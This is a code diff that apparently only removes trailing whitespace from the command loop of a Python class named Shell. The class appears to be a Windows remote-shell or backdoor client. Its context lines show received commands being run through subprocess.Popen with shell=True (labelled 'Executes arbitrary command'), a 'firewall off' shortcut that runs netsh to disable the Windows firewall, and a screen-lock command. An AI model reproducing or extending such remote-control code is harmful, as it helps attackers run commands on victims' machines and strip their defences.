@@ -33,29 +33,29 @@ class Shell:
                 data = data.strip('\n')
 
                 # Special cases
-                
+
                 # Exits shell
-                if data == "quit" or data == "exit":  
+                if data == "quit" or data == "exit":
                     break
-                
+
                 # Changes directory
-                if data[:2] == "cd":  
+                if data[:2] == "cd":
                     os.chdir(data[3:])
 
                 # Lists cwd with ls
-                if data == "ls":  
+                if data == "ls":
                     data = "dir"
-                
+
                 # Disables/enables firewall
                 if data == "firewall off":
                     data = "netsh advfirewall set currentprofile state off"
                 if data == "firewall on":
                     data = "netsh advfirewall set currentprofile state on"
-                    
+
                 if data == "lock":
                     ctypes.windll.user32.LockWorkStation()
                     data = "echo Screen locked"
-                
+
                 if len(data) > 0:
                     # Executes arbitrary command
                     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
